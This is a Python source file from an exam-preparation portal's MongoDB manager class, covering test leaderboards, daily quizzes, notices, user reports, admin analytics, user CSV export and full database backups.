    def get_test_leaderboard(self, test_id, current_user_id=None):
        tid = str(test_id).strip()
        best_by_user = {}
        for entry in self.dbs:
            try:
                for doc in entry["db"].test_attempts.find({"test_id": tid}):
                    u = str(doc.get("user_id", ""))
                    sc = float(doc.get("score", 0))
                    if u not in best_by_user or sc > best_by_user[u]["score"]:
                        best_by_user[u] = {
                            "attempt_id": doc.get("attempt_id", ""),
                            "user_id": u,
                            "user_name": doc.get("user_name", "Student"),
                            "vip_badge": doc.get("vip_badge", ""),
                            "score": sc,
                            "max_marks": float(doc.get("max_marks", 100)),
                            "accuracy": float(doc.get("accuracy", 0)),
                            "correct": int(doc.get("correct", 0)),
                            "incorrect": int(doc.get("incorrect", 0)),
                            "time_taken_sec": int(doc.get("time_taken_sec", 0)),
                            "submitted_at": doc.get("submitted_at", "")
                        }
            except Exception:
                continue

        ranked = sorted(best_by_user.values(), key=lambda x: (-x["score"], -x["accuracy"], x["time_taken_sec"]))
        total_students = len(ranked)
        topper = ranked[0] if ranked else None
        avg_score = round(sum(x["score"] for x in ranked) / total_students, 2) if total_students else 0
        avg_acc = round(sum(x["accuracy"] for x in ranked) / total_students, 1) if total_students else 0

        my_rank, my_percentile = None, None
        if current_user_id:
            cuid = str(current_user_id).strip()
            for i, item in enumerate(ranked, start=1):
                if item["user_id"] == cuid:
                    my_rank = i
                    my_percentile = 100.0 if total_students <= 1 else round(((total_students - i) / total_students) * 100, 1)
                    break

        return {
            "test_id": tid,
            "total_participants": total_students,
            "my_rank": my_rank,
            "my_percentile": my_percentile,
            "topper": topper,
            "avg_score": avg_score,
            "avg_accuracy": avg_acc,
            "top_10": [{**item, "rank": i} for i, item in enumerate(ranked[:10], start=1)]
        }

    def get_user_test_history(self, user_id, limit=60):
        uid = str(user_id).strip()
        entry = self.find_user_db(uid)
        if not entry:
            return []
        docs = list(entry["db"].test_attempts.find({"user_id": uid}).sort("ts", DESCENDING).limit(limit))
        return [clean_doc(d) for d in docs]

    # ---------------------------------------------------------
    # DAILY RAPID QUIZ, CURRENT AFFAIRS CAPSULES & SCHEDULED MOCKS
    # ---------------------------------------------------------
    def publish_daily_quiz(self, questions, title="Daily 5-Min Rapid Quiz"):
        entry = self.get_primary_db()
        if not entry or not isinstance(questions, list) or not questions:
            return False
        doc = {
            "_id": "active_daily_quiz",
            "title": str(title or "Daily Rapid Quiz").strip(),
            "questions": questions[:20],
            "date": today_ist_str(),
            "updated_at": now_ist_str()
        }
        entry["db"].content_hub.update_one({"_id": "active_daily_quiz"}, {"$set": doc}, upsert=True)
        self.log_admin_action("PUBLISH_QUIZ", f"Published {len(questions)} daily quiz Qs")
        return True

    def get_daily_quiz(self):
        entry = self.get_primary_db()
        if not entry:
            return None
        doc = entry["db"].content_hub.find_one({"_id": "active_daily_quiz"})
        return clean_doc(doc) if doc else None

    def add_ca_capsule(self, title, points, category="Current Affairs"):
        entry = self.get_primary_db()
        if not entry:
            return None
        doc = {
            "capsule_id": f"ca_{int(time.time() * 1000)}",
            "title": str(title or "Daily GK Update").strip(),
            "category": str(category or "Current Affairs").strip(),
            "points": points if isinstance(points, list) else [str(points)],
            "date": today_ist_str(),
            "created_at": now_ist_str(),
            "ts": int(time.time())
        }
        entry["db"].ca_capsules.insert_one(doc)
        self.log_admin_action("PUBLISH_CA", f"Added CA Capsule: {doc['title']}")
        return clean_doc(doc)

    def get_ca_capsules(self, limit=25):
        entry = self.get_primary_db()
        if not entry:
            return []
        return [clean_doc(d) for d in entry["db"].ca_capsules.find().sort("ts", DESCENDING).limit(limit)]

    def delete_ca_capsule(self, cid):
        entry = self.get_primary_db()
        if not entry:
            return False
        return entry["db"].ca_capsules.delete_one({"capsule_id": cid}).deleted_count > 0

    def save_scheduled_mock(self, payload):
        entry = self.get_primary_db()
        if not entry:
            return None
        doc = {
            "sched_id": payload.get("sched_id") or f"sch_{int(time.time())}",
            "test_id": str(payload.get("test_id", "")).strip(),
            "series_id": str(payload.get("series_id", "")).strip(),
            "title": str(payload.get("title", "Sunday Weekly Live Mock")).strip(),
            "start_time": str(payload.get("start_time", "")).strip(),
            "result_time": str(payload.get("result_time", "")).strip(),
            "active": True,
            "created_at": now_ist_str(),
            "ts": int(time.time())
        }
        entry["db"].scheduled_mocks.update_one({"sched_id": doc["sched_id"]}, {"$set": doc}, upsert=True)
        self.log_admin_action("SCHEDULE_MOCK", f"{doc['title']} (Test #{doc['test_id']})")
        return clean_doc(doc)

    def get_scheduled_mocks(self):
        entry = self.get_primary_db()
        if not entry:
            return []
        return [clean_doc(d) for d in entry["db"].scheduled_mocks.find({"active": True}).sort("ts", DESCENDING).limit(15)]

    def delete_scheduled_mock(self, sched_id):
        entry = self.get_primary_db()
        if not entry:
            return False
        return entry["db"].scheduled_mocks.delete_one({"sched_id": sched_id}).deleted_count > 0

    # ---------------------------------------------------------
    # NOTICES & 2-WAY REPORTS
    # ---------------------------------------------------------
    def add_notice(self, title, message, level="info"):
        entry = self.get_primary_db()
        if not entry:
            return None
        doc = {
            "notice_id": f"not_{int(time.time())}",
            "title": title.strip(),
            "message": message.strip(),
            "level": level or "info",
            "active": True,
            "created_at": now_ist_str(),
            "ts": int(time.time())
        }
        entry["db"].notices.insert_one(doc)
        self.log_admin_action("ADD_NOTICE", doc["title"])
        return clean_doc(doc)

    def get_active_notices(self, limit=15):
        entry = self.get_primary_db()
        if not entry:
            return []
        return [clean_doc(d) for d in entry["db"].notices.find({"active": True}).sort("ts", DESCENDING).limit(limit)]

    def delete_notice(self, notice_id):
        entry = self.get_primary_db()
        if not entry:
            return False
        ok = entry["db"].notices.delete_one({"notice_id": notice_id}).deleted_count > 0
        if ok:
            self.log_admin_action("DELETE_NOTICE", notice_id)
        return ok

    def save_report(self, payload):
        entry = self.get_primary_db()
        if not entry:
            return None
        doc = {
            "report_id": f"rep_{int(time.time() * 1000)}",
            "user_id": str(payload.get("user_id", "N/A")),
            "user_name": payload.get("user_name", "Student"),
            "phone": payload.get("phone", "N/A"),
            "type": payload.get("type", "Issue"),
            "subject": payload.get("subject", "General"),
            "message": payload.get("message", ""),
            "question_id": str(payload.get("question_id", "")),
            "test_id": str(payload.get("test_id", "")),
            "status": "OPEN",
            "admin_reply": "",
            "created_at": now_ist_str(),
            "ts": int(time.time())
        }
        entry["db"].reports.insert_one(doc)
        return clean_doc(doc)

    def get_reports(self, limit=40):
        entry = self.get_primary_db()
        if not entry:
            return []
        return [clean_doc(d) for d in entry["db"].reports.find().sort("ts", DESCENDING).limit(limit)]

    def reply_and_resolve_report(self, report_id, reply_text=""):
        entry = self.get_primary_db()
        if not entry:
            return False
        rep = entry["db"].reports.find_one({"report_id": report_id})
        if not rep:
            return False
        clean_reply = str(reply_text or "").strip()
        entry["db"].reports.update_one(
            {"report_id": report_id},
            {"$set": {
                "status": "RESOLVED",
                "admin_reply": clean_reply or "Resolved by Admin",
                "replied_at": now_ist_str()
            }}
        )
        uid = rep.get("user_id")
        if uid and uid != "N/A" and uid != "Guest":
            self.send_personal_message(
                uid,
                f"Reply: {rep.get('subject', 'Your Report')}",
                clean_reply or "Aapki report resolve kar di gayi hai!",
                msg_type="report_reply"
            )
        self.log_admin_action("REPLY_REPORT", f"Report {report_id} resolved")
        return True

    # ---------------------------------------------------------
    # ANALYTICS: 7-DAY GROWTH, TOP PERFORMERS, TEST DIFFICULTY & DIAGNOSTICS
    # ---------------------------------------------------------
    def get_7day_growth_stats(self):
        today = datetime.now(IST).date()
        days = [(today - timedelta(days=i)).strftime("%Y-%m-%d") for i in range(6, -1, -1)]
        stats = {d: {"date": d, "label": d[5:], "new_users": 0, "active_users": 0, "tests": 0} for d in days}

        for entry in self.dbs:
            db = entry["db"]
            try:
                for u in db.users.find({}, {"joined_date": 1, "last_active_date": 1}):
                    jd = u.get("joined_date")
                    ad = u.get("last_active_date")
                    if jd in stats:
                        stats[jd]["new_users"] += 1
                    if ad in stats:
                        stats[ad]["active_users"] += 1
                for t in db.test_attempts.find({"date": {"$in": days}}, {"date": 1}):
                    td = t.get("date")
                    if td in stats:
                        stats[td]["tests"] += 1
            except Exception:
                continue
        return [stats[d] for d in days]

    def get_top_performers(self, limit=20):
        agg = {}
        user_meta = {}
        for entry in self.dbs:
            try:
                for u in entry["db"].users.find({"is_blocked": {"$ne": True}}, {"user_id": 1, "name": 1, "study_streak": 1, "vip_badge": 1, "state_district": 1}):
                    user_meta[str(u["user_id"])] = u
                for t in entry["db"].test_attempts.find({}, {"user_id": 1, "user_name": 1, "score": 1, "max_marks": 1, "accuracy": 1}):
                    uid = str(t.get("user_id", ""))
                    if not uid:
                        continue
                    if uid not in agg:
                        agg[uid] = {"user_id": uid, "user_name": t.get("user_name", "Student"), "tests": 0, "acc_sum": 0.0, "score_pct_sum": 0.0}
                    agg[uid]["tests"] += 1
                    agg[uid]["acc_sum"] += float(t.get("accuracy", 0))
                    mm = float(t.get("max_marks", 100)) or 100.0
                    agg[uid]["score_pct_sum"] += (float(t.get("score", 0)) / mm) * 100.0
            except Exception:
                continue

        board = []
        for uid, row in agg.items():
            um = user_meta.get(uid, {})
            cnt = row["tests"] or 1
            board.append({
                "user_id": uid,
                "name": um.get("name") or row["user_name"],
                "vip_badge": um.get("vip_badge", ""),
                "state": um.get("state_district", ""),
                "tests_given": row["tests"],
                "avg_accuracy": round(row["acc_sum"] / cnt, 1),
                "avg_score_pct": round(row["score_pct_sum"] / cnt, 1),
                "streak": int(um.get("study_streak", 1))
            })
        board.sort(key=lambda x: (-x["tests_given"], -x["avg_accuracy"], -x["streak"]))
        return board[:limit]

    def get_test_analytics(self, limit=25):
        by_test = {}
        for entry in self.dbs:
            try:
                for t in entry["db"].test_attempts.find():
                    tid = str(t.get("test_id", ""))
                    if not tid:
                        continue
                    if tid not in by_test:
                        by_test[tid] = {
                            "test_id": tid,
                            "test_title": t.get("test_title", f"Test #{tid}"),
                            "attempts": 0,
                            "acc_sum": 0.0,
                            "score_sum": 0.0,
                            "max_marks": float(t.get("max_marks", 100)),
                            "top_attempts": []
                        }
                    by_test[tid]["attempts"] += 1
                    by_test[tid]["acc_sum"] += float(t.get("accuracy", 0))
                    by_test[tid]["score_sum"] += float(t.get("score", 0))
                    by_test[tid]["top_attempts"].append({
                        "attempt_id": t.get("attempt_id", ""),
                        "user_id": t.get("user_id", ""),
                        "user_name": t.get("user_name", "Student"),
                        "score": float(t.get("score", 0)),
                        "accuracy": float(t.get("accuracy", 0)),
                        "submitted_at": t.get("submitted_at", "")
                    })
            except Exception:
                continue

        result = []
        for tid, r in by_test.items():
            cnt = r["attempts"] or 1
            avg_acc = round(r["acc_sum"] / cnt, 1)
            diff = "Hard" if avg_acc < 45 else ("Moderate" if avg_acc < 72 else "Easy")
            r["top_attempts"].sort(key=lambda x: -x["score"])
            result.append({
                "test_id": tid,
                "test_title": r["test_title"],
                "attempts": cnt,
                "avg_score": round(r["score_sum"] / cnt, 1),
                "max_marks": r["max_marks"],
                "avg_accuracy": avg_acc,
                "difficulty": diff,
                "top_attempts": r["top_attempts"][:10]
            })
        result.sort(key=lambda x: -x["attempts"])
        return result[:limit]

    def run_system_diagnostics(self):
        shards_diag = []
        for entry in self.dbs:
            t0 = time.time()
            try:
                entry["client"].admin.command("ping")
                ms = round((time.time() - t0) * 1000, 1)
                shards_diag.append({"name": entry["label"], "ok": True, "latency_ms": ms, "size_mb": self.get_db_size_mb(entry)})
            except Exception as e:
                shards_diag.append({"name": entry["label"], "ok": False, "error": str(e)[:120]})

        externals = []
        for label, url in [("Cloudflare Worker", config.WORKER_PROXY_HEALTH_URL), ("RWA Upstream API", config.RWA_UPSTREAM_API_URL)]:
            t0 = time.time()
            try:
                r = requests.get(url, timeout=6)
                externals.append({"name": label, "ok": r.status_code < 500, "status": r.status_code, "latency_ms": round((time.time() - t0) * 1000, 1)})
            except Exception as e:
                externals.append({"name": label, "ok": False, "error": str(e)[:120]})

        return {
            "checked_at": now_ist_str(),
            "shards": shards_diag,
            "externals": externals,
            "strict_security": config.STRICT_SECURITY_ENABLED
        }

    # ---------------------------------------------------------
    # ADMIN PANEL QUERIES & CSV EXPORT
    # ---------------------------------------------------------
    def get_cluster_stats(self):
        per_db = []
        total_users = active_today = online_users = logged_out_users = blocked_users = total_tests = total_logs = 0
        today = today_ist_str()

        for entry in self.dbs:
            db = entry["db"]
            try:
                u_cnt = db.users.count_documents({})
                a_cnt = db.users.count_documents({"last_active_date": today})
                b_cnt = db.users.count_documents({"is_blocked": True})
                out_cnt = db.users.count_documents({"is_blocked": {"$ne": True}, "is_logged_in": False})
                on_cnt = db.users.count_documents({"is_blocked": {"$ne": True}, "is_logged_in": {"$ne": False}})
                t_cnt = db.test_attempts.count_documents({})
                l_cnt = db.activity_logs.count_documents({})
                size_mb = self.get_db_size_mb(entry)

                total_users += u_cnt
                active_today += a_cnt
                blocked_users += b_cnt
                online_users += on_cnt
                logged_out_users += out_cnt
                total_tests += t_cnt
                total_logs += l_cnt

                per_db.append({"label": entry["label"], "users": u_cnt, "tests": t_cnt, "size_mb": size_mb, "max_mb": 512.0})
            except Exception:
                per_db.append({"label": entry["label"], "error": True})

        primary = self.get_primary_db()
        open_reports = primary["db"].reports.count_documents({"status": {"$ne": "RESOLVED"}}) if primary else 0
        error_cnt = primary["db"].error_logs.count_documents({}) if primary else 0

        return {
            "connected_dbs": len(self.dbs),
            "connection_errors": self.connection_errors,
            "per_db": per_db,
            "total_users": total_users,
            "active_today": active_today,
            "online_users": online_users,
            "logged_out_users": logged_out_users,
            "live_radar_count": len(self.get_live_radar_users(120)),
            "blocked_users": blocked_users,
            "banned_ips_count": len(self.get_banned_ips()),
            "total_tests": total_tests,
            "total_logs": total_logs,
            "total_admin_tokens": len(self.get_all_admin_tokens(for_admin=True)),
            "active_notices": len(self.get_active_notices()),
            "open_reports": open_reports,
            "error_logs_count": error_cnt,
            "growth_7d": self.get_7day_growth_stats(),
            "settings": self.get_portal_settings(),
            "updated_at": now_ist_str()
        }

    def get_all_users_paginated(self, page=1, per_page=15, query="", filter_mode="all"):
        all_users = []
        q = str(query or "").strip().lower()
        today = today_ist_str()

        for entry in self.dbs:
            try:
                for u in entry["db"].users.find():
                    d = decrypt_user_doc(u)
                    is_blk = bool(d.get("is_blocked", False))
                    is_out = d.get("is_logged_in") is False

                    if filter_mode == "blocked" and not is_blk:
                        continue
                    if filter_mode == "online" and (is_blk or is_out):
                        continue
                    if filter_mode == "logged_out" and (is_blk or not is_out):
                        continue
                    if filter_mode == "active" and d.get("last_active_date") != today:
                        continue
                    if filter_mode == "vip" and not d.get("vip_badge"):
                        continue

                    if q:
                        hay = " ".join([
                            str(d.get("user_id", "")), str(d.get("name", "")),
                            str(d.get("phone", "")), str(d.get("email", "")),
                            str(d.get("username", "")), str(d.get("state_district", "")),
                            str(d.get("last_ip", ""))
                        ]).lower()
                        if q not in hay:
                            continue
                    all_users.append(d)
            except Exception:
                continue

        all_users.sort(key=lambda x: x.get("last_seen_ts", 0), reverse=True)
        total = len(all_users)
        start = (page - 1) * per_page
        return all_users[start:start + per_page], total

    def search_users(self, query):
        items, _ = self.get_all_users_paginated(page=1, per_page=15, query=query)
        return items

    def get_user_full_dossier(self, user_id):
        uid = str(user_id).strip()
        entry = self.find_user_db(uid)
        if not entry:
            return None
        db = entry["db"]
        user = decrypt_user_doc(db.users.find_one({"user_id": uid}))
        sync = clean_doc(db.user_sync.find_one({"user_id": uid})) or {}
        tests = [clean_doc(t) for t in db.test_attempts.find({"user_id": uid}).sort("ts", DESCENDING).limit(60)]
        logs = [clean_doc(l) for l in db.activity_logs.find({"user_id": uid}).sort("ts", DESCENDING).limit(60)]
        messages = self.get_user_inbox(uid, limit=20)
        return {
            "shard": entry["label"],
            "user": user,
            "sync": sync,
            "tests": tests,
            "logs": logs,
            "messages": messages
        }

    def get_recent_global_activities(self, limit=40):
        merged = []
        for entry in self.dbs:
            try:
                docs = list(entry["db"].activity_logs.find().sort("ts", DESCENDING).limit(limit))
                merged.extend([clean_doc(d) for d in docs])
            except Exception:
                continue
        merged.sort(key=lambda x: x.get("ts", 0), reverse=True)
        return merged[:limit]

    def export_users_csv_text(self):
        import csv
        import io
        buf = io.StringIO()
        writer = csv.writer(buf)
        writer.writerow(["User ID", "Name", "Phone", "Email", "State/District", "Status", "VIP Badge", "Streak", "Last IP", "Device", "Last Seen", "Shard"])
        users, _ = self.get_all_users_paginated(page=1, per_page=10000)
        for u in users:
            st = "BLOCKED" if u.get("is_blocked") else ("LOGGED OUT" if u.get("is_logged_in") is False else "ONLINE")
            writer.writerow([
                u.get("user_id", ""), u.get("name", ""), u.get("phone", ""), u.get("email", ""),
                u.get("state_district", ""), st, u.get("vip_badge", ""), u.get("study_streak", 1),
                u.get("last_ip", ""), u.get("last_device", ""), u.get("last_seen", ""), u.get("db_shard", "")
            ])
        return buf.getvalue()

    def export_full_backup(self):
        backup = {"exported_at": now_ist_str(), "shards": {}}
        for entry in self.dbs:
            db = entry["db"]
            try:
                backup["shards"][entry["label"]] = {
                    "users": [clean_doc(d) for d in db.users.find()],  # stays encrypted at-rest in backup!
                    "user_sync": [clean_doc(d) for d in db.user_sync.find()],
                    "test_attempts": [clean_doc(d) for d in db.test_attempts.find()],
                    "admin_tokens": [clean_doc(d) for d in db.admin_tokens.find()],
                    "notices": [clean_doc(d) for d in db.notices.find()],
                    "reports": [clean_doc(d) for d in db.reports.find()],
                    "settings": [clean_doc(d) for d in db.settings.find()]
                }
            except Exception as e:
                backup["shards"][entry["label"]] = {"error": str(e)}
        return backup


db_manager = MultiMongoManager()
